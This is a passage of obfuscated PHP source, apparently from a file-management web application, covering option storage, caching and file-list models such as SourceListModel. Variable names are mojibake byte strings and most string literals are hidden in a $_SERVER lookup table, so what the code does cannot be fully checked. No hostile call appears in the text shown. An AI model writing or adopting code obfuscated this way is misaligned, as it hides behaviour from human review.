time(); Model($this->modelType)->set($…­˜Š°ª[401], $­»©è§¨, $this->optionType . $…­˜Š°ª[402]); Model($this->modelType)->set($…­˜Š°ª[400] . $­»©è§¨, $§üî¬–æ, $this->optionType); return $­»©è§¨; } public function update($ìÛ»«¢ğ, $Ì–­‚ Ç) { $»éá“è =& $_SERVER[ë¦»ºéÌ]; $Ì–­‚ Ç = array_field_key($Ì–­‚ Ç, $this->field); $¦ğê“çî = $this->listData($ìÛ»«¢ğ); if (!$¦ğê“çî || !$ìÛ»«¢ğ) { return !1; } $Ì–­‚ Ç = array_merge($¦ğê“çî, $Ì–­‚ Ç); $Ì–­‚ Ç[$»éá“è[96]] = time(); return Model($this->modelType)->set($»éá“è[400] . $ìÛ»«¢ğ, $Ì–­‚ Ç, $this->optionType); } public function remove($€¹ë‘µì) { if (!$€¹ë‘µì) { return !1; } return Model($this->modelType)->remove($_SERVER[ë¦»ºéÌ][400] . $€¹ë‘µì, $this->optionType); } public function clear() { $¥°ğİ½¶ =& $_SERVER[ë¦»ºéÌ]; Model($this->modelType)->remove($¥°ğİ½¶[401], $this->optionType . $¥°ğİ½¶[402]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($†±¯€Ş, $·áœ½±á) { if (!$·áœ½±á) { return !1; } $“íÚã = $this->listData(); $“íÚã = array_to_keyvalue($“íÚã, $†±¯€Ş); return isset($“íÚã[$·áœ½±á]) ? $“íÚã[$·áœ½±á] : !1; } public function findByName($ø„İÔî‰) { return $this->findByKey($_SERVER[ë¦»ºéÌ][42], $ø„İÔî‰); } protected function resetData($‚›¿Åé£) { $™ïı†Ğ¸ =& $_SERVER[ë¦»ºéÌ]; $‚›¿Åé£ = is_array($‚›¿Åé£) ? $‚›¿Åé£ : array(); $ôí°ù·˜ = array(); for ($‰Æ¡°è× = 0; $‰Æ¡°è× < count($‚›¿Åé£); $‰Æ¡°è×++) { $ôí°ù·˜[$™ïı†Ğ¸[400] . $‚›¿Åé£[$‰Æ¡°è×][$™ïı†Ğ¸[403]]] = $‚›¿Åé£[$‰Æ¡°è×]; } return Model($this->modelType)->set($ôí°ù·˜, !1, $this->optionType); } private function getAutoName($ßÖ‡­ÅÌ) { $Ùæè¢Ö = array_to_keyvalue($this->listData(), $_SERVER[ë¦»ºéÌ][42]); if (!$Ùæè¢Ö || !isset($Ùæè¢Ö[$ßÖ‡­ÅÌ])) { return $ßÖ‡­ÅÌ; } for ($©ÙÃŠ “ = 1; $©ÙÃŠ “ < count($Ùæè¢Ö); $©ÙÃŠ “++) { $˜ºÁ°°Î = $ßÖ‡­ÅÌ . "\50{$©ÙÃŠ “}\51"; if (!isset($Ùæè¢Ö[$˜ºÁ°°Î])) { return $˜ºÁ°°Î; } } return $˜ºÁ°°Î; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ûô»¸¼× = false, $ô¿€Æ¦¹ = '', $Ú¿Å¨Ëë = false) { $áÙõÔú =& $_SERVER[ë¦»ºéÌ]; $²„„Íä = $this->cacheGet($ô¿€Æ¦¹); $«‰¶ÀÆŒ = $this->optionDefault($ô¿€Æ¦¹); $«‰¶ÀÆŒ = is_array($«‰¶ÀÆŒ) ? $«‰¶ÀÆŒ : array(); if (is_array($²„„Íä)) { $²„„Íä = array_merge($«‰¶ÀÆŒ, $²„„Íä); return $ûô»¸¼× ? isset($²„„Íä[$ûô»¸¼×]) ? $²„„Íä[$ûô»¸¼×] : null : $²„„Íä; } $£öÅ”Éñ = $this->filterWhere(array($áÙõÔú[43] => $ô¿€Æ¦¹)); $²„„Íä = $this->where($£öÅ”Éñ)->select(); $²„„Íä = array_to_keyvalue($²„„Íä, $áÙõÔú[105], $áÙõÔú[380]); foreach ($²„„Íä as $¯Å«½Ÿï => $Ïş©Ãü) { if ($Ú¿Å¨Ëë || in_array($¯Å«½Ÿï, $this->jsonField)) { $²„„Íä[$¯Å«½Ÿï] = json_decode($Ïş©Ãü, !0); } } $this->cacheSet($ô¿€Æ¦¹, $²„„Íä); $²„„Íä = array_merge($«‰¶ÀÆŒ, $²„„Íä); return $ûô»¸¼× ? $²„„Íä[$ûô»¸¼×] : $²„„Íä; } public function set($İÙ¶ùì¯, $ôë¤é²Á = false, $Úú©”ï = '') { $¤İ¹ç™¶ =& $_SERVER[ë¦»ºéÌ]; $this->cacheRemove($Úú©”ï); $´İŠú½ = array(); $Ùüß®—Õ = is_array($İÙ¶ùì¯) ? $İÙ¶ùì¯ : array($İÙ¶ùì¯ => $ôë¤é²Á); foreach ($Ùüß®—Õ as $çµçç®Ñ => $Ó¢Û‰ÁÙ) { if (is_array($Ó¢Û‰ÁÙ)) { $Ó¢Û‰ÁÙ = json_encode_force($Ó¢Û‰ÁÙ); } $this->checkLength($Ó¢Û‰ÁÙ, !1, $this->tableName . $¤İ¹ç™¶[4] . $İÙ¶ùì¯); $Ó¢Û‰ÁÙ = self::textEncode($Ó¢Û‰ÁÙ); $Ùüß®—Õ = array($¤İ¹ç™¶[43] => $Úú©”ï, $¤İ¹ç™¶[105] => $çµçç®Ñ, $¤İ¹ç™¶[380] => $Ó¢Û‰ÁÙ); $´İŠú½[] = $this->filterWhere($Ùüß®—Õ); } if (!$´İŠú½) { return !0; } return $this->addAll($´İŠú½, array(), !0); } protected function optionDefault($›âœ©¿› = '') { return !1; } public function setDeep($šŸ‹Ğêë, $“ Î¼ŞÏ = false, $…¹Èî²İ = '') { $‚ş“ûá = explode($_SERVER[ë¦»ºéÌ][10], $šŸ‹Ğêë); $Íº·„Æˆ = $this->get(); array_set_value($Íº·„Æˆ, $šŸ‹Ğêë, $“ Î¼ŞÏ); $this->set($‚ş“ûá[0], $Íº·„Æˆ[$‚ş“ûá[0]], $…¹Èî²İ); } public function remove($ÖûÀ–à, $ÆİĞÀèí = '') { $·û™¨ŒØ =& $_SERVER[ë¦»ºéÌ]; $this->cacheRemove($ÆİĞÀèí); $¶­âùğµ = $this->filterWhere(array($·û™¨ŒØ[105] => $ÖûÀ–à, $·û™¨ŒØ[43] => $ÆİĞÀèí)); if (is_null($ÖûÀ–à)) { unset($¶­âùğµ[$·û™¨ŒØ[105]]); } return $this->where($¶­âùğµ)->delete(); } public function cacheSet($è°ôÜ‰, $èäÄöã = false) { return Cache::set($this->cacheKey($è°ôÜ‰), $èäÄöã); } public function cacheGet($şÒÎæí…) { return Cache::get($this->cacheKey($şÒÎæí…)); } public function cacheRemove($óøİ°şÄ) { return Cache::remove($this->cacheKey($óøİ°şÄ)); } protected function filterWhere($ñÉŒÏê) { return $ñÉŒÏê; } protected function cacheKey($›Í¾»½¿) { return $›Í¾»½¿; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\x72\x63\145"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\x6d\x65" => "\151\157\x5f\163\x6f\165\x72\x63\x65\137\x6d\145\x74\x61", "\155\145\x74\141\x46\151\145\x6c\144" => "\x73\157\165\162\x63\145\111\x44"); protected $dataAuto = array(array("\x6d\157\144\x69\146\171\124\x69\155\x65", "\164\x69\x6d\x65", "\151\156\x73\145\x72\164", "\x66\165\x6e\143\164\151\x6f\156"), array("\143\162\145\x61\x74\145\124\x69\155\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\x65\x72\x74", "\146\165\x6e\x63\164\151\157\156"), array("\166\x69\145\x77\124\151\155\145", "\164\151\x6d\x65", "\x69\156\x73\x65\162\x74", "\146\165\156\143\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ê€³½é²) { return $this->listSource(array($_SERVER[ë¦»ºéÌ][404] => $Ê€³½é²)); } public function typeName($×„ìûı) { static $Ñ¿è½Ñ… = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\x6d", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $Ñ¿è½Ñ…[$×„ìûı . $_SERVER[ë¦»ºéÌ][12]]; } public function sourceListInfo($ÍÕ¯Åèé, $‹ƒªÑÙ = false) { $¨÷ëÒ”î =& $_SERVER[ë¦»ºéÌ]; $ÍÕ¯Åèé = $ÍÕ¯Åèé ? $ÍÕ¯Åèé : array(); $ÍÕ¯Åèé = array_filter(array_unique($ÍÕ¯Åèé)); if (!$ÍÕ¯Åèé) { return array(); } $¨¦¿¿ÛÁ = $this->where(array($¨÷ëÒ”î[405] => array($¨÷ëÒ”î[7], $ÍÕ¯Åèé)))->select(); $this->_listDataApply($¨¦¿¿ÛÁ, $‹ƒªÑÙ); return array_to_keyvalue($¨¦¿¿ÛÁ, $¨÷ëÒ”î[405]); } public function pathInfoFilter(&$°åìë¸) { $¡‘Šöãİ =& $_SERVER[ë¦»ºéÌ]; static $¶«ã¼ ‡ = false; static $Ó‘ÉãËì = false; static $± Ëêóô = false; if (!$¶«ã¼ ‡) { $¸§«ïÛ… = $¡‘Šöãİ[406]; $¸§«ïÛ… .= $¡‘Šöãİ[407]; $¸§«ïÛ… .= $¡‘Šöãİ[408]; $ñ¬ï¿öÉ = $¡‘Šöãİ[409]; $¢Ç‰»½© = explode($¡‘Šöãİ[60], $ñ¬ï¿öÉ); $¶«ã¼ ‡ = explode($¡‘Šöãİ[60], $¸§«ïÛ…); $Ó‘ÉãËì = array(); foreach ($¶«ã¼ ‡ as $ÌÊÚÄÃã) { if (in_array($ÌÊÚÄÃã, $¢Ç‰»½©)) { continue; } $Ó‘ÉãËì[] = $ÌÊÚÄÃã; } $± Ëêóô = explode($¡‘Šöãİ[60], $¡‘Šöãİ[410]); } foreach ($± Ëêóô as $àÙªü‚) { if (isset($°åìë¸[$àÙªü‚])) { $°åìë¸[$àÙªü‚] = intval($°åìë¸[$àÙªü‚]); } } $°åìë¸[$¡‘Šöãİ[88]] = $¡‘Šöãİ[411] . $°åìë¸[$¡‘Šöãİ[405]] . $¡‘Šöãİ[412]; $°åìë¸[$¡‘Šöãİ[43]] = $°åìë¸[$¡‘Šöãİ[413]] == 1 ? $¡‘Šöãİ[89] : $¡‘Šöãİ[204]; $°åìë¸[$¡‘Šöãİ[414]] = $this->typeName($°åìë¸[$¡‘Šöãİ[414]]); if ($°åìë¸[$¡‘Šöãİ[413]] != 1) { $°åìë¸[$¡‘Šöãİ[179]] = $°åìë¸[$¡‘Šöãİ[415]]; unset($°åìë¸[$¡‘Šöãİ[415]]); } $ÂË¨Øî = $¶«ã¼ ‡; if (isset($°åìë¸[$¡‘Šöãİ[416]]) && $°åìë¸[$¡‘Šöãİ[416]][$¡‘Šöãİ[417]] == -1) { $ÂË¨Øî = $Ó‘ÉãËì; } $°åìë¸ = array_field_key($°åìë¸, $ÂË¨Øî); return $°åìë¸; } public function listUserFav() { $æÆÅ¹ò€ =& $_SERVER[ë¦»ºéÌ]; $ÓîŒÑ«œ = Model($æÆÅ¹ò€[418])->listData(); $úõ¢°¾Ğ = array_filter_by_field($ÓîŒÑ«œ, $æÆÅ¹ò€[43], $æÆÅ¹ò€[419]); $úõ¢°¾Ğ = array_to_keyvalue($úõ¢°¾Ğ, $æÆÅ¹ò€[12], $æÆÅ¹ò€[88]); if ($úõ¢°¾Ğ) { $íÜÜå”¬ = $this->listSource(array($æÆÅ¹ò€[420] => array($æÆÅ¹ò€[421], $úõ¢°¾Ğ))); } $íÜÜå”¬ = array_to_keyvalue($íÜÜå”¬[$æÆÅ¹ò€[375]], $æÆÅ¹ò€[405]); foreach ($ÓîŒÑ«œ as &$©şç´Ò€) { $©şç´Ò€ = array($æÆÅ¹ò€[422] => $©şç´Ò€[$æÆÅ¹ò€[403]], $æÆÅ¹ò€[423] => $©şç´Ò€[$æÆÅ¹ò€[42]], $æÆÅ¹ò€[424] => $©şç´Ò€[$æÆÅ¹ò€[88]], $æÆÅ¹ò€[425] => $©şç´Ò€[$æÆÅ¹ò€[43]], $æÆÅ¹ò€[426] => $©şç´Ò€[$æÆÅ¹ò€[205]], $æÆÅ¹ò€[427] => $©şç´Ò€[$æÆÅ¹ò€[96]]); if ($©şç´Ò€[$æÆÅ¹ò€[43]] == $æÆÅ¹ò€[419] && $íÜÜå”¬[$©şç´Ò€[$æÆÅ¹ò€[88]]]) { $©şç´Ò€[$æÆÅ¹ò€[97]] = $íÜÜå”¬[$©şç´Ò€[$æÆÅ¹ò€[88]]]; } } unset($©şç´Ò€); return $ÓîŒÑ«œ; } public function listUserTag($ÕÉªò÷Ñ) { $™ÌÚÀ§Í =& $_SERVER[ë¦»ºéÌ]; if ($ÕÉªò÷Ñ && !is_array($ÕÉªò÷Ñ)) { $ÕÉªò÷Ñ = array($ÕÉªò÷Ñ); } $íŠ­¾êœ = Model($™ÌÚÀ§Í[428])->listData(); $€îĞæŒ = array(); foreach ($íŠ­¾êœ as $ßôã—Ö°) { $¹¼³° = $ßôã—Ö°[$™ÌÚÀ§Í[88]]; if (!$¹¼³°) { continue; } if (!isset($€îĞæŒ[$¹¼³°])) { $€îĞæŒ[$¹¼³°] = array(); } $€îĞæŒ[$¹¼³°][] = $ßôã—Ö°[$™ÌÚÀ§Í[429]]; } $Ãä•ü = array(); foreach ($€îĞæŒ as $ìä¼÷çÃ => $øœ®î±¹) { $ïõ›îœõ = !0; if (!$ÕÉªò÷Ñ) { $Ãä•ü[] = $ìä¼÷çÃ; continue; } foreach ($ÕÉªò÷Ñ as $‡áßªàÂ) { if (!in_array($‡áßªàÂ, $øœ®î±¹)) { $ïõ›îœõ = !1; break; } } if ($ïõ›îœõ) { $Ãä•ü[] = $ìä¼÷çÃ; } } if (!$Ãä•ü) { return array(); } $«™ğ®ç = $this->listSource(array($™ÌÚÀ§Í[420] => array($™ÌÚÀ§Í[421], $Ãä•ü))); if (!$«™ğ®ç || count($Ãä•ü) == $«™ğ®ç[$™ÌÚÀ§Í[372]][$™ÌÚÀ§Í[373]]) { return $«™ğ®ç; } $¯Ğì‹«Æ = array(); $ûæ‘å˜ = array_to_keyvalue($«™ğ®ç[$™ÌÚÀ§Í[87]], $™ÌÚÀ§Í[12], $™ÌÚÀ§Í[405]); $æù€­­· = array_to_keyvalue($«™ğ®ç[$™ÌÚÀ§Í[86]], $™ÌÚÀ§Í[12], $™ÌÚÀ§Í[405]); $Ñ½‰ş¬ï = array_merge($æù€­­·, $ûæ‘å˜); foreach ($Ãä•ü as $¹¼³°) { if (!in_array($¹¼³°, $Ñ½‰ş¬ï)) { $¯Ğì‹«Æ[] = $¹¼³°; } } if ($¯Ğì‹«Æ) { Model($™ÌÚÀ§Í[430])->removeBySource($¯Ğì‹«Æ); } return $«™ğ®ç; } public function listUserRecycle() { $ááãë’ =& $_SERVER[ë¦»ºéÌ]; $ê÷µ¨ª² = Model($ááãë’[431])->listData(); if (!$ê÷µ¨ª²) { return array(); } $ÄÔ­­™Á = array($ááãë’[420] => array($ááãë’[421], $ê÷µ¨ª²), $ááãë’[432] => 1); return $this->listSource($ÄÔ­­™Á); } public function listSource($çÂÎËÂ, $í”şÑÓ¡ = 3000) { $èÊÛ«Š =& $_SERVER[ë¦»ºéÌ]; if (!isset($çÂÎËÂ[$èÊÛ«Š[433]])) { $çÂÎËÂ[$èÊÛ«Š[433]] = 0; } $‡ÏÙÃôò = $èÊÛ«Š[434]; $õ–¼ûÚ› = $this->field($‡ÏÙÃôò)->_makeOrder()->where($çÂÎËÂ)->selectPage($í”şÑÓ¡); $this->_listPageCheck($õ–¼ûÚ›, $‡ÏÙÃôò, $çÂÎËÂ); $this->_listDataApply($õ–¼ûÚ›[$èÊÛ«Š[375]]); $this->_listMake($õ–¼ûÚ›); return $õ–¼ûÚ›; } private function _listPageCheck(&$Á¤äÖŒ¯, $Ëš‚±±ø, $•Û†ù’§) { $•‚©±Êæ =& $_SERVER[ë¦»ºéÌ]; if (!is_array($Á¤äÖŒ¯[$•‚©±Êæ[372]])) { return; } $ğÑé«§Ó = $Á¤äÖŒ¯[$•‚©±Êæ[372]]; if ($ğÑé«§Ó[$•‚©±Êæ[374]] <= 1) { return; } if ($ğÑé«§Ó[$•‚©±Êæ[373]] >= 100000) { return; } if (Model($•‚©±Êæ[435])->get($•‚©±Êæ[436]) != $•‚©±Êæ[437]) { return; } $Ëš‚±±ø = str_replace(array($•‚©±Êæ[63], $•‚©±Êæ[348], $•‚©±Êæ[18]), $•‚©±Êæ[12], $Ëš‚±±ø); $Ëš‚±±ø = $•‚©±Êæ[438] . str_replace($•‚©±Êæ[60], $•‚©±Êæ[439], $Ëš‚±±ø) . $•‚©±Êæ[440]; $ÉÌãøéÕ = $•‚©±Êæ[441]; $ÉÌãøéÕ = $ÉÌãøéÕ . $•‚©±Êæ[442]; $¦èÈäË = $ğÑé«§Ó[$•‚©±Êæ[369]] * ($ğÑé«§Ó[$•‚©±Êæ[359]] - 1) . $•‚©±Êæ[60] . $ğÑé«§Ó[$•‚©±Êæ[369]]; $’ÌıÛÎ· = $this->_makeOrder(!0); $ÁËıı´‹ = $•‚©±Êæ[438] . str_replace($•‚©±Êæ[60], $•‚©±Êæ[439], $’ÌıÛÎ·[0]); if (strpos($ÁËıı´‹, $•‚©±Êæ[443])) { $ÁËıı´‹ = str_replace($•‚©±Êæ[443], $•‚©±Êæ[444], $ÁËıı´‹); } else { $ÁËıı´‹ .= $•‚©±Êæ[445] . $’ÌıÛÎ·[1]; } $†–Ù“…½ = array(); foreach ($•Û†ù’§ as $ î¥Õˆ— => $ı­×·®) { $†–Ù“…½[$•‚©±Êæ[438] . $ î¥Õˆ—] = $ı­×·®; } $this->alias($•‚©±Êæ[446])->field($Ëš‚±±ø)->limit($¦èÈäË)->order($ÁËıı´‹); $€ëë€„Ã = $this->join($ÉÌãøéÕ)->where($†–Ù“…½)->select(); if ($€ëë€„Ã) { $Á¤äÖŒ¯[$•‚©±Êæ[375]] = $€ëë€„Ã; } } protected function _makeOrder($…¿Œ¢µ = false) { $ÖĞ­§äí =& $_SERVER[ë¦»ºéÌ]; $úáøÜ† = Model($ÖĞ­§äí[447])->get($ÖĞ­§äí[448]); $‚œ¬­õ® = Model($ÖĞ­§äí[447])->get($ÖĞ­§äí[449]); $‘²¼·Ú‘ = array($ÖĞ­§äí[450] => $ÖĞ­§äí[451], $ÖĞ­§äí[452] => $ÖĞ­§äí[453]); $ÎÛİÌ = array($ÖĞ­§äí[42] => $ÖĞ­§äí[42], $ÖĞ­§äí[90] => $ÖĞ­§äí[90], $ÖĞ­§äí[179] => $ÖĞ­§äí[415], $ÖĞ­§äí[454] => $ÖĞ­§äí[454], $ÖĞ­§äí[455] => $ÖĞ­§äí[456], $ÖĞ­§äí[205] => $ÖĞ­§äí[205], $ÖĞ­§äí[96] => $ÖĞ­§äí[96]); $¨ìÃÍ¶¢ = Input::get($ÖĞ­§äí[457], $ÖĞ­§äí[7], $úáøÜ†, array_keys($ÎÛİÌ)); $¹÷ì÷´® = Input::get($ÖĞ­§äí[458], $ÖĞ­§äí[7], $‚œ¬­õ®, array_keys($‘²¼·Ú‘)); if (!in_array($¨ìÃÍ¶¢, array_keys($ÎÛİÌ))) { $¨ìÃÍ¶¢ = $ÖĞ­§äí[42]; } if (!in_array($¹÷ì÷´®, array_keys($‘²¼·Ú‘))) { $¨ìÃÍ¶¢ = $ÖĞ­§äí[450]; } if ($¨ìÃÍ¶¢ == $ÖĞ­§äí[42]) { } $ú†ÃïÈ¾ = $ÖĞ­§äí[459] . $ÎÛİÌ[$¨ìÃÍ¶¢] . $ÖĞ­§äí[63] . $‘²¼·Ú‘[$¹÷ì÷´®]; $ú†ÃïÈ¾ = rtrim(trim($ú†ÃïÈ¾), $ÖĞ­§äí[60]); if ($…¿Œ¢µ) { return array($ú†ÃïÈ¾, $‘²¼·Ú‘[$¹÷ì÷´®]); } return $this->order($ú†ÃïÈ¾); } protected function _listDataApplyItem($Áúîö, $¢š÷Ìá = false) { $Çèó¹ıô = array($Áúîö); $this->_listDataApply($Çèó¹ıô, $¢š÷Ìá); return $Çèó¹ıô[0]; } protected function _listDataApply(&$¡–ÏÆ™¨, $ÖºÅµÉÚ = false) { $ãÊ¬™ê£ =& $_SERVER[ë¦»ºéÌ]; if (!$¡–ÏÆ™¨) { $¡–ÏÆ™¨ = array(); return; } $ùÄ…“×— = array_to_keyvalue($¡–ÏÆ™¨, $ãÊ¬™ê£[12], $ãÊ¬™ê£[405]); $ùÄ…“×— = array_unique($ùÄ…“×—); $this->_listSourceCache($¡–ÏÆ™¨); if (!$ÖºÅµÉÚ) { $this->_listAppendMeta($¡–ÏÆ™¨, $ùÄ…“×—); $this->_listAppendFileMeta($¡–ÏÆ™¨, $ùÄ…“×—); $this->_listAppendChildren($¡–ÏÆ™¨, $ùÄ…“×—); } $this->_listAppendPath($¡–ÏÆ™¨); $this->_listAppendAuth($¡–ÏÆ™¨); $this->_listAppendSourceInfo($¡–ÏÆ™¨, $ùÄ…“×—); $this->_listAppendUser($¡–ÏÆ™¨); $this->_listFilterInfo($¡–ÏÆ™¨, $ÖºÅµÉÚ); $this->_listAppendAuthSecret($¡–ÏÆ™¨); } protected function _listSourceCache($èÂíœıÃ) { $ÅŠèÑÛ³ =& $_SERVER[ë¦»ºéÌ]; foreach ($èÂíœıÃ as $ê›ô™½ó) { self::$cacheSourceInfo[$ÅŠèÑÛ³[460] . $ê›ô™½ó[$ÅŠèÑÛ³[405]]] = $ê›ô™½ó; } } protected function _listFilterInfo(&$Ùñ±û§é, $û·È¼Å¬ = false) { $¬¡âÜ =& $_SERVER[ë¦»ºéÌ]; foreach ($Ùñ±û§é as &$¹öğ¸•†) { $¹öğ¸•† = $this->pathInfoFilter($¹öğ¸•†); self::$cachePathInfo[$¬¡âÜ[461] . intval($û·È¼Å¬) . $¬¡âÜ[462] . $¹öğ¸•†[$¬¡âÜ[405]]] = $¹öğ¸•†; } unset($¹öğ¸•†); } protected function _listMake(&$ô†Å„áØ) { $¢×¯ŠğŒ =& $_SERVER[ë¦»ºéÌ]; $ô†Å„áØ[$¢×¯ŠğŒ[87]] = array(); $ô†Å„áØ[$¢×¯ŠğŒ[86]] = array(); foreach ($ô†Å„áØ[$¢×¯ŠğŒ[375]] as $àß·©ì‡) { $ÅÒ’üêš = $àß·©ì‡[$¢×¯ŠğŒ[413]] == 1 ? $¢×¯ŠğŒ[87] : $¢×¯ŠğŒ[86]; $ô†Å„áØ[$ÅÒ’üêš][] = $àß·©ì‡; } unset($ô†Å„áØ[$¢×¯ŠğŒ[375]]); } protected function _listAppendMeta(&$Íî¬¥êû, $¾–ËªÍ) { $Ã—ëã« =& $_SERVER[ë¦»ºéÌ]; $†²­ıİ» = array($Ã—ëã«[420] => array($Ã—ëã«[421], $¾–ËªÍ)); $¦íÎ«ò‡ = Model($Ã—ëã«[463])->field($Ã—ëã«[464])->where($†²­ıİ»)->select(); if (!$¦íÎ«ò‡) { return; } $Öîû»¥ = array($Ã—ëã«[465], $Ã—ëã«[466], $Ã—ëã«[444]); $Á³ãß¯ = array(); foreach ($¦íÎ«ò‡ as $û‚Œ±Ó‹) { if (!isset($Á³ãß¯[$û‚Œ±Ó‹[$Ã—ëã«[405]]])) { $Á³ãß¯[$û‚Œ±Ó‹[$Ã—ëã«[405]]] = array(); } if (in_array($û‚Œ±Ó‹[$Ã—ëã«[105]], $Öîû»¥)) { continue; } $Á³ãß¯[$û‚Œ±Ó‹[$Ã—ëã«[405]]][$û‚Œ±Ó‹[$Ã—ëã«[105]]] = $û‚Œ±Ó‹[$Ã—ëã«[380]]; } foreach ($Íî¬¥êû as &$À±È§Õ) { $À±È§Õ[$Ã—ëã«[467]] = !1; if (isset($Á³ãß¯[$À±È§Õ[$Ã—ëã«[405]]])) { $À±È§Õ[$Ã—ëã«[467]] = $Á³ãß¯[$À±È§Õ[$Ã—ëã«[405]]]; } if ($this->fileIsLock($À±È§Õ) && $À±È§Õ[$Ã—ëã«[416]]) { $ÂúØÂÈ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $À±È§Õ[$Ã—ëã«[416]][$Ã—ëã«[417]] = AuthModel::authDisable($À±È§Õ[$Ã—ëã«[416]][$Ã—ëã«[417]], $ÂúØÂÈ); $À±È§Õ[$Ã—ëã«[416]][$Ã—ëã«[468]][$Ã—ëã«[416]] = $À±È§Õ[$Ã—ëã«[416]][$Ã—ëã«[417]]; } } unset($À±È§Õ); } protected function _listAppendFileMeta(&$ÔàÀŠõ, $–·µĞËÖ) { $×¸ÜŸ• =& $_SERVER[ë¦»ºéÌ]; $Ğ£¯ğõ = array_to_keyvalue($ÔàÀŠõ, $×¸ÜŸ•[12], $×¸ÜŸ•[469]); $Ğ£¯ğõ = array_filter(array_unique($Ğ£¯ğõ)); if (!$Ğ£¯ğõ) { return; } $ØÍ³™ç½ = array($×¸ÜŸ•[470] => array($×¸ÜŸ•[421], $Ğ£¯ğõ)); $ŸıÀôÆÀ = $×¸ÜŸ•[471]; $¶ãÏ°ªÑ = Model($×¸ÜŸ•[472])->field($ŸıÀôÆÀ)->where($ØÍ³™ç½)->select(); $¶ãÏ°ªÑ = array_to_keyvalue($¶ãÏ°ªÑ, $×¸ÜŸ•[469]); $È®Ö“Ê© = Model($×¸ÜŸ•[473])->field($×¸ÜŸ•[474])->where($ØÍ³™ç½)->select(); $È®Ö“Ê© = $È®Ö“Ê© ? $È®Ö“Ê© : array(); $¶ú„òã = array(); foreach ($È®Ö“Ê© as $ÙÙŞ³») { if (!isset($¶ú„òã[$ÙÙŞ³»[$×¸ÜŸ•[469]]])) { $¶ú„òã[$ÙÙŞ³»[$×¸ÜŸ•[469]]] = array(); } $¶ú„òã[$ÙÙŞ³»[$×¸ÜŸ•[469]]][$ÙÙŞ³»[$×¸ÜŸ•[105]]] = $ÙÙŞ³»[$×¸ÜŸ•[380]]; } foreach ($ÔàÀŠõ as &$‘±«²É”) { $÷Ë³‰ã = $‘±«²É”[$×¸ÜŸ•[469]]; if (!$÷Ë³‰ã || !is_array($¶ãÏ°ªÑ[$÷Ë³‰ã])) { continue; } $º’ÜŸûß = $¶ãÏ°ªÑ[$÷Ë³‰ã]; $º’ÜŸûß[$×¸ÜŸ•[90]] = $‘±«²É”[$×¸ÜŸ•[90]]; $º’ÜŸûß[$×¸ÜŸ•[42]] = $‘±«²É”[$×¸ÜŸ•[42]]; if (!isset(self::$cacheFileInfo[$×¸ÜŸ•[475] . $÷Ë³‰ã])) { self::$cacheFileInfo[$×¸ÜŸ•[475] . $÷Ë³‰ã] = array_merge(array(), $º’ÜŸûß); } unset($¶ãÏ°ªÑ[$÷Ë³‰ã][$×¸ÜŸ•[88]]); $±¬©¯Òí = is_array($¶ú„òã[$÷Ë³‰ã]) ? $¶ú„òã[$÷Ë³‰ã] : array(); $‘±«²É”[$×¸ÜŸ•[175]] = array_merge($±¬©¯Òí, $¶ãÏ°ªÑ[$÷Ë³‰ã]); if (isset($‘±«²É”[$×¸ÜŸ•[175]][$×¸ÜŸ•[174]])) { $‘±«²É”[$×¸ÜŸ•[174]] = json_decode($‘±«²É”[$×¸ÜŸ•[175]][$×¸ÜŸ•[174]], !0); unset($‘±«²É”[$×¸ÜŸ•[175]][$×¸ÜŸ•[174]]); } } unset($‘±«²É”); } protected function _listAppendSourceInfo(&$¬š·ù˜, $Õ©Æ¶“¬) { $´¦˜•Á× =& $_SERVER[ë¦»ºéÌ]; if (!defined($´¦˜•Á×[476])) { return; } $âàÂ’Ã = Model($´¦˜•Á×[477])->listData(); $ÏÍÁÇÖ‰ = Model($´¦˜•Á×[428])->listData(); $Õ²‘Îİ¥ = Model($´¦˜•Á×[418])->listData(); $üş­˜»Ö = Model($´¦˜•Á×[478])->listSimple(); $¾³¢¯ = array_to_keyvalue($âàÂ’Ã, $´¦˜•Á×[403]); $œˆ¯ò½Ô = array_to_keyvalue_group($ÏÍÁÇÖ‰, $´¦˜•Á×[88], $´¦˜•Á×[429]); $‰ü»ÃÁ = array_to_keyvalue($Õ²‘Îİ¥, $´¦˜•Á×[88]); $ìë°ğÀ = array_to_keyvalue_group($üş­˜»Ö, $´¦˜•Á×[405]); foreach ($¬š·ù˜ as &$âùÒ¦–¿) { $âùÒ¦–¿[$´¦˜•Á×[97]] = array($´¦˜•Á×[479] => 0, $´¦˜•Á×[480] => 0, $´¦˜•Á×[481] => 0); if (isset($‰ü»ÃÁ[$âùÒ¦–¿[$´¦˜•Á×[405]]])) { $âùÒ¦–¿[$´¦˜•Á×[97]][$´¦˜•Á×[482]] = 1; $âùÒ¦–¿[$´¦˜•Á×[97]][$´¦˜•Á×[483]] = $‰ü»ÃÁ[$âùÒ¦–¿[$´¦˜•Á×[405]]][$´¦˜•Á×[42]]; } if (isset($œˆ¯ò½Ô[$âùÒ¦–¿[$´¦˜•Á×[405]]])) { $âùÒ¦–¿[$´¦˜•Á×[97]][$´¦˜•Á×[484]] = array(); foreach ($œˆ¯ò½Ô[$âùÒ¦–¿[$´¦˜•Á×[405]]] as $ÈÖÍˆêá) { $¦€î¹šè = $¾³¢¯[$ÈÖÍˆêá]; $âùÒ¦–¿[$´¦˜•Á×[97]][$´¦˜•Á×[484]][] = array($´¦˜•Á×[485] => $¦€î¹šè[$´¦˜•Á×[403]], $´¦˜•Á×[423] => $¦€î¹šè[$´¦˜•Á×[42]], $´¦˜•Á×[486] => $¦€î¹šè[$´¦˜•Á×[487]]); } } if (isset($ìë°ğÀ[$âùÒ¦–¿[$´¦˜•Á×[405]]])) { $âùÒ¦–¿[$´¦˜•Á×[97]][$´¦˜•Á×[488]] = array(); foreach 